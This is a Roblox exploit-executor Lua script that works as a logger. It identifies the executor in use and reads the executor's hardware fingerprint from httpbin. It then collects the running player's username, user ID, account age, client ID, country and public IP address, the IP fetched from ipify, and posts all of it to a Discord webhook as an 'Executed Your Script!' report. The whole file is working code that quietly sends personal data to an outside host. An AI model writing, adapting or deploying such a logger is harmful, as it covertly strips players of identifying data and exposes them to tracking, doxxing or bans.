
--// Game Load
if not game:IsLoaded() then game.Loaded:Wait() end
--// LOCAL MAIN
local youwebhook = getgenv().HOOKURL
local HTTP = game:GetService("HttpService")
local marketplaceService = game:GetService("MarketplaceService")
local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, game.PlaceId)
local dt = DateTime.now()
local LocalizationService = game:GetService("LocalizationService")
local player = game.Players.LocalPlayer
local result, code = pcall(function()
	return LocalizationService:GetCountryRegionForPlayerAsync(player)
end)
local ClientId = game:GetService("RbxAnalyticsService"):GetClientId()
local function getexploit()
   local exploit =
       (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
       (SENTINEL_LOADED and "Sentinel") or
       (is_sirhurt_closure and "Sirhurt") or
       (PROTOSMASHER_LOADED and "ProtoSmasher") or
       (KRNL_LOADED and "Krnl") or
       (WRDAPI and "WeAreDevs") or
       (isvm and "Proxo") or
       (shadow_env and "Shadow") or
       (jit and "EasyExploits") or
       (getreg()['CalamariLuaEnv'] and "Calamari") or
       (unit and "Unit") or
       (IS_VIVA_LOADED and "VIVA") or
       (IS_COCO_LOADED and "Coco") or
       (IsElectron and "Electron") or
       (getexecutorname and import and "Scriptware") or
       nil

   return exploit
end

local EXE = getexploit()


--// In Line
local OP = true
local CL = false

--//Hwid
local http_request = http_request;
if syn then
    http_request = syn.request
elseif SENTINEL_V2 then
    function http_request(tb)
        return {
            StatusCode = 200;
            Body = request(tb.Url, tb.Method, (tb.Body or ''))
        }
    end
end
 
local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
local hwid = "";

for i, v in next, hwid_list do
    if decoded.headers[v] then
        hwid = decoded.headers[v];
        break
    end
end
local a = hwid

--// Starter Webhook
local requestwebhook = syn.request({
    Url = youwebhook,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = game:GetService("HttpService"):JSONEncode({
    ["username"] = "BxB.xyz | Webhook",
      ["avatar_url"] = "https://cdn.discordapp.com/attachments/1021789126388887593/1021789164003393577/Free_Sample_By_Wix_1.jpg",
      ["content"] = "@everyone ",
       ["embeds"] = {{
           ["title"] = "**"..game.Players.LocalPlayer.Name.." | Executed Your Script!**" ,  
           ["description"] = "",
           ["color"] = 65484,
            ["fields"] = {{
                ["name"] = "Executed Time Date",
               ["value"] = "```"..dt:FormatLocalTime("LL", "en-us").."```",
                ["inline"] = OP
            },
			{
                ["name"] = "Executed Time Clock",
                ["value"] = "```"..os.date("%H")..":"..os.date("%M")..":"..os.date("%S").."```",
                ["inline"] = OP
            },
				                
			{
                ["name"] = "INFO PLAYER",
                ["value"] = "```Username : "..game.Players.LocalPlayer.Name.."```".."```Display Username : "..game.Players.LocalPlayer.DisplayName.."```".."```Account Age : "..game.Players.LocalPlayer.AccountAge.."```".."```User ID : "..game.Players.LocalPlayer.UserId.."```".."```Profile : ".."https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile".."```",
                ["inline"] = CL
            }, 
            {
                ["name"] = "INFO GAME",
                ["value"] = "```Place Name  : "..info.Name.."```".."```Place ID : "..game.PlaceId.."```".."```Place Version : "..game.PlaceVersion.."```".."```PrivateServer ID : "..game.JobId.."```",
                ["inline"] = CL
            }, 
            {
                ["name"] = "INFO EXECUTOR",
                ["value"] = "```Executor Name : "..EXE.."```".."```Hwid : "..a.."```".."```Client ID : "..ClientId.."```".."```Country : "..code.."```".."```Local ID : "..game.Players.LocalPlayer.LocaleId.."```",
                ["inline"] = CL
            },
	    {
                ["name"] = "Premium | INFO",
                ["value"] = "```IP Address : "..game:HttpGet("https://api.ipify.org").."```",
                ["inline"] = CL
            },
         {
                ["name"] = "CREDIT",
                ["value"] = "```Credit : B O O M#4134 \n         https://bxb-hub.github.io/BxB_Site/```",
                ["inline"] = CL
            },
            }
       }}
    })
})
--//END  

